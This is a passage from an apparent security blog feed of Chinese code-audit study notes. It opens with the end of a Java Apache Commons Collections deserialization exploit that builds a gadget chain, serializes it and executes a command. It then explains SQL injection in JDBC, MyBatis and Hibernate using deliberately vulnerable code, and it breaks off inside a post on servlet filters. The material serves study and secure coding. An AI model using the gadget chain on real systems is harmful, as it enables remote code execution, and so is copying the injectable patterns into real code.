class-name">Transformer</span> transformerChain <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Map</span> innerMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Map</span> lazyMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap<span class="token punctuation">,</span> transformerChain<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">TiedMapEntry</span> entry <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>lazyMap<span class="token punctuation">,</span> <span class="token string">"foo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">BadAttributeValueExpException</span> poc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Field</span> valfield <span class="token operator">=</span> poc<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"val"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        valfield<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        valfield<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>poc<span class="token punctuation">,</span> entry<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">File</span> f <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">"payload.ser"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectOutputStream</span> out <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>poc<span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">FileInputStream</span> fis <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"payload.ser"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>fis<span class="token punctuation">)</span><span class="token punctuation">;</span>        ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ois<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里执行的命令是 uname，运行代码可以看到报错信息里显示了 Darwin，说明命令被成功执行了。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202111211611336.png"></p><p>这样就利用代码注入实现了 Apache Commons collections 反序列化漏洞有回显的利用。</p><blockquote><p>参考链接：</p><p><a href="https://www.freebuf.com/vuls/251664.html">https://www.freebuf.com/vuls/251664.html</a></p><p><a href="https://www.anquanke.com/post/id/224487">https://www.anquanke.com/post/id/224487</a></p><p><a href="https://blog.csdn.net/Candyys/article/details/106006282">https://blog.csdn.net/Candyys/article/details/106006282</a></p><p><a href="https://blog.csdn.net/java276582434/article/details/90550578">https://blog.csdn.net/java276582434/article/details/90550578</a></p><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-命令注入&quot;&gt;&lt;a href=&quot;#0x01-命令注入&quot; class=&quot;headerlink&quot; title=&quot;0x01 命令注入&quot;&gt;&lt;/a&gt;0x01 命令注入&lt;/h1&gt;&lt;p&gt;在开发过程中，开发人员可能需要对系统文件进行移动、删除或者执行一些系统命令，这时如果</summary>
      
    
    
    
    <category term="代码审计" scheme="https://www.teamssix.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="代码审计" scheme="https://www.teamssix.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>【代码审计】SQL 注入</title>
    <link href="https://www.teamssix.com/211117-091653.html"/>
    <id>https://www.teamssix.com/211117-091653.html</id>
    <published>2021-11-17T01:16:53.000Z</published>
    <updated>2021-11-22T08:59:49.391Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-JDBC-拼接不当造成-SQL-注入"><a href="#0x01-JDBC-拼接不当造成-SQL-注入" class="headerlink" title="0x01 JDBC 拼接不当造成 SQL 注入"></a>0x01 JDBC 拼接不当造成 SQL 注入</h1><p>JDBC 有两种方法执行 SQL 语句，分别为 PrepareStatement 和 Statement，两个方法的区别在于 PrepareStatement 会对 SQL 语句进行预编译，而 Statement 在每次执行时都需要编译，会增大系统开销。</p><p>理论上 PrepareStatement 的效率和安全性会比 Statement 好，但不意味着就不会存在问题。</p><p>以下是一个使用 Statement 执行 SQL 语句的示例</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> sql <span class="token operator">=</span> <span class="token string">"select * from user where id ="</span><span class="token operator">+</span>req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">PrintWriter</span> out <span class="token operator">=</span> resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Statement Demo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"SQL: "</span><span class="token operator">+</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">try</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">Statement</span> st <span class="token operator">=</span> conn<span class="token punctuation">.</span><span class="token function">createStatement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">ResultSet</span> rs <span class="token operator">=</span> st<span class="token punctuation">.</span><span class="token function">executeQuery</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里如果输入的 id 为 1 or 1 = 2，那么 SQL 语句就会被拼接为 select * from user where id = 1 or 1 = 2，改变了想要查询 id = 1 的语义。 </p><p>PreqareStatement 方法支持使用 ? 对变量位进行占位，在预编译阶段填入相应的值会构造出完整的 SQL 语句，从而避免 SQL 注入的产生。</p><p>但开发有时为了便利，会直接采取拼接的方式构造 SQL 语句，这样一来依然会存在 SQL 注入，如下代码所示。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> sql <span class="token operator">=</span> <span class="token string">"select * from user where id ="</span><span class="token operator">+</span>req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">PrintWriter</span> out <span class="token operator">=</span> resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"prepareStatement Demo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"SQL: "</span><span class="token operator">+</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">try</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">PreparedStatement</span> pst <span class="token operator">=</span> conn<span class="token punctuation">.</span><span class="token function">prepareStatement</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">ResultSet</span> rs <span class="token operator">=</span> pst<span class="token punctuation">.</span><span class="token function">executeQuery</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时如果使用 or 1 = 1 仍然可以判断存在 SQL 注入，但是如果使用 ? 作为占位符，填入的字段的值就会进行严格的类型检查，就可以有效的避免 SQL 注入的产生，如下代码所示。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">PrintWriter</span> out <span class="token operator">=</span> resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"prepareStatement Demo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> sql <span class="token operator">=</span> <span class="token string">"select * from user where id = ?"</span><span class="token punctuation">;</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">try</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">PreparedStatement</span> pstt <span class="token operator">=</span> conn<span class="token punctuation">.</span><span class="token function">prepareStatement</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 参数已经强制要求是整型</span>    pstt<span class="token punctuation">.</span><span class="token function">setInt</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">parseInt</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">ResultSet</span> rs <span class="token operator">=</span> pstt<span class="token punctuation">.</span><span class="token function">executeQuery</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>rs<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x02-框架使用不当造成-SQL-注入"><a href="#0x02-框架使用不当造成-SQL-注入" class="headerlink" title="0x02 框架使用不当造成 SQL 注入"></a>0x02 框架使用不当造成 SQL 注入</h1><p>通常框架底层已经实现了对 SQL 注入的防御，但是如果在开发未能恰当的使用框架的情况下，依然会存在 SQL 注入的风险。</p><h2 id="1、MyBatis-框架"><a href="#1、MyBatis-框架" class="headerlink" title="1、MyBatis 框架"></a>1、MyBatis 框架</h2><p>MyBatis 的思想是将 SQL 语句编入配置文件中，避免 SQL 语句在代码中大量出现，方便对 SQL 语句的修改和配置。</p><p>MyBatis 使用 parameterType 向 SQL 语句传参，在 SQL 引用传参的时候可以使用 #{} 和 ${} 两种方式，两种方式区别如下：</p><p>${}：SQL 拼接符号，直接将输入的语句拼接到 SQL 语句里，想避免 SQL 注入问题需要手动添加过滤</p><p>#{}：占位符号，在对数据解析时会自动将输入的语句前后加上单引号从而避免 SQL 注入</p><p>也就是说在 MyBatis 框架中，如果使用了 ${} 方法，同时又没有进行过滤就会产生 SQL 注入，而使用 #{} 方法时可以避免 SQL 注入。</p><h2 id="2、Hibernate-框架"><a href="#2、Hibernate-框架" class="headerlink" title="2、Hibernate 框架"></a>2、Hibernate 框架</h2><p>Hibernate 是现今主流的 Java 数据库持久化框架，采用 Hibernate 查询语句（HQL）注入。</p><p>HQL 查询语句来自 Hibernate 引擎进行解析，因此产生的错误可能来自数据库，也有可能来自 Hibernate 引擎。 </p><p>HQL 和 SQL 的区别：</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202111172027760.png"></p><p>HQL 注入和 SQL 注入的成因都一样，使用拼接 HQL 语句的写法可能会导致 SQL 注入</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Query</span> query <span class="token operator">=</span> session<span class="token punctuation">.</span><span class="token function">createQuery</span><span class="token punctuation">(</span><span class="token string">"from User where name='"</span><span class="token operator">+</span>queryString<span class="token operator">+</span><span class="token string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但是受语法影响，HQL注入在漏洞利用上有一定的限制，比如不能利用联合查询、不能跨库查表、执行命令等。</p><p>对于 Hibernate 的注入，这里只作为简单了解一下，平时代审的时候注意一下即可。</p><blockquote><p>参考文章：</p><p><a href="https://www.redhatzone.com/ask/article/1448.html">https://www.redhatzone.com/ask/article/1448.html</a></p><p><a href="https://www.redhatzone.com/ask/article/1448.html">https://blog.csdn.net/qq_36594628/article/details/119461996</a></p><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-JDBC-拼接不当造成-SQL-注入&quot;&gt;&lt;a href=&quot;#0x01-JDBC-拼接不当造成-SQL-注入&quot; class=&quot;headerlink&quot; title=&quot;0x01 JDBC 拼接不当造成 SQL 注入&quot;&gt;&lt;/a&gt;0x01 JDBC 拼接不当造成 </summary>
      
    
    
    
    <category term="代码审计" scheme="https://www.teamssix.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="代码审计" scheme="https://www.teamssix.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>【代码审计】Java Web 过滤器-filter</title>
    <link href="https://www.teamssix.com/211116-112510.html"/>
    <id>https://www.teamssix.com/211116-112510.html</id>
    <published>2021-11-16T03:25:10.000Z</published>
    <updated>2021-11-22T08:59:50.255Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>filter 被称为过滤器，是 Servlet 2.3 新增的一个特性，同时也是 Serlvet 技术中最实用的技术。</p><p>过滤器实际上就是对 Web 资源进行拦截，做一些处理后再交给下一个过滤器或 Servlet 处理，通常都是用来拦截 request 进行处理的，也可以对返回的 response 进行拦截处理。</p><p>开发人员利用 filter 技术，可以实现对所有 Web 资源的管理，例如实现权限访问控制、过滤敏感词汇、压缩响应信息等一些高级功能。</p><h1 id="0x01-filter-的配置"><a href="#0x01-filter-的配置" class="headerlink" title="0x01 filter 的配置"></a>0x01 filter 的配置</h1><p>filter 的配置类似于 Servlet，由 filter 和 filter-mapping 两组标签组成，和 Servlet 一样，如果版本大于 3.0 也可以使用注解的方式来配置 filter</p><h2 id="1、基于-web-xml-的配置"><a href="#1、基于-web-xml-的配置" class="headerlink" title="1、基于 web.xml 的配置"></a>1、基于 web.xml 的配置</h2><p>以下是一个基于 web.xml 的配置内容</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>web-app</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://java.sun.com/xml/ns/javaee<span class="token punctuation">"</span></span>           <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>           <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd<span class="token punctuation">"</span></span>           <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2.5<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>display-name</span><span class="token punctuation">></span></span>manage<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>display-name</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>welcome-file-list</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>welcome-file</span><span class="token punctuation">></span></span>index.html<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>welcome-file</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>welcome-file</span><span class="token punctuation">></span></span>index.jsp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>welcome-file</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>welcome-file-list</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>description</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>description</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>display-name</span><span class="token punctuation">></span></span>user<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>display-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>user<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">></span></span>com.sec.servlet.UserServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>user<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/user<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>display-name</span><span class="token punctuation">></span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>display-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">></span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-class</span><span class="token punctuation">></span></span>com.sec.test.test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-class</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-mapping</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">></span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-mapping</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>web-app</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>标签含义如下：</p><pre class="line-numbers language-none"><code class="language-none">&lt;filter&gt; 指定一个过滤器&lt;filter-name&gt; 为过滤器指定一个名称，该项不能为空&lt;filter-class&gt; 用于指定过滤器的完整的限定类名&lt;init-param&gt; 用于为过滤器指定初始化参数  &lt;param-name&gt; 为 &lt;init-param&gt; 的子参数，用于指定参数的名称  &lt;param-value&gt; 为 &lt;init-param&gt; 的子参数，用于指定参数的值&lt;filter-mapping&gt; 用于设置一个 filter 负责拦截的资源  &lt;filer-name&gt; 为 &lt;filer-mapping&gt; 的子参数，用于设置 filter 的注册名称，该值必须是在 &lt;filter&gt; 元素中声明过的过滤器的名称  &lt;url-pattern&gt; 用于设置 filter 所拦截的请求路径&lt;servlet-name&gt; 用于指定过滤器所拦截的 Servlet 名称<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2、基于注解的方法"><a href="#2、基于注解的方法" class="headerlink" title="2、基于注解的方法"></a>2、基于注解的方法</h2><p>示例代码如下</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span><span class="token annotation punctuation">@WebFilter</span><span class="token punctuation">(</span>description<span class="token operator">=</span><span class="token string">"this is filter test"</span><span class="token punctuation">,</span>urlPatterns<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"/filterTest"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> filterTest <span class="token keyword">implements</span> <span class="token class-name">Filter</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">/*销毁时调用*/</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doFilter</span><span class="token punctuation">(</span><span class="token class-name">ServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">ServletResponse</span> resp<span class="token punctuation">,</span> <span class="token class-name">FilterChain</span> chain<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token comment">/*过滤方法 主要是对request和response进行一些处理，然后交给下一个过滤器或Servlet处理*/</span>          chain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> resp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//交给下一个过滤器或servlet处理</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token class-name">FilterConfig</span> config<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>        <span class="token comment">/*初始化方法  接收一个FilterConfig类型的参数 该参数是对Filter的一些配置*/</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>与 Servlet 一样，使用 web.xml 可以配置的 filter 属性也都可以使用注解进行配置，但一般不推荐使用注解配置，因为使用 web.xml 可以控制过滤器的执行顺序，而使用注解的方式则不行。</p><h1 id="0x02-filter-的流程"><a href="#0x02-filter-的流程" class="headerlink" title="0x02 filter 的流程"></a>0x02 filter 的流程</h1><p>filter 的流程很简单，具体如下：</p><pre class="line-numbers language-none"><code class="language-none">用户向服务器发送请求|服务器|filter 1|......|filter n|service()方法|filter n|......|filter 1|服务器|服务器返回结果给用户<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先用户向服务器发起请求，之后请求经过过滤器到达 Servlet 中的 service() 方法，最后再经过过滤器返回给用户。</p><p>这里值得注意的是过滤器在接收请求和返回请求的时候顺序是相反的。</p><h1 id="0x03-filter-的接口方法"><a href="#0x03-filter-的接口方法" class="headerlink" title="0x03 filter 的接口方法"></a>0x03 filter 的接口方法</h1><p>filter 接口方法如下：</p><h2 id="1、init-接口"><a href="#1、init-接口" class="headerlink" title="1、init() 接口"></a>1、init() 接口</h2><p>该接口与 Servlet 里的 init() 方法类似，主要用来初始化过滤器。如果初始化代码中要用到 FilterConfig 对象，那这些初始化代码只能在 filter 的 init() 方法中编写。</p><p>init() 方法的定义如下：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token class-name">FilterConfig</span> config<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>        <span class="token comment">/*初始化方法  接收一个FilterConfig类型的参数 该参数是对Filter的一些配置*/</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="2、doFilter-接口"><a href="#2、doFilter-接口" class="headerlink" title="2、doFilter() 接口"></a>2、doFilter() 接口</h2><p>doFilter 方法类似于 Servlet 接口的 service() 方法，filter 通过该接口实现具体的过滤操作，当客户请求访问与过滤器关联的 URL 的时候，Servlet 过滤器将先执行doFilter 方法，FilterChain 参数用于访问后续过滤器。</p><p>doFilter() 方法定义如下：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doFilter</span><span class="token punctuation">(</span><span class="token class-name">ServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">ServletResponse</span> resp<span class="token punctuation">,</span> <span class="token class-name">FilterChain</span> chain<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token comment">/*过滤方法 主要是对request和response进行一些处理，然后交给下一个过滤器或Servlet处理*/</span>          chain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> resp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//交给下一个过滤器或servlet处理</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3、destroy-接口"><a href="#3、destroy-接口" class="headerlink" title="3、destroy() 接口"></a>3、destroy() 接口</h2><p>destroy() 接口和 servlet 里的 destroy() 作用类似，用于释放被 filter 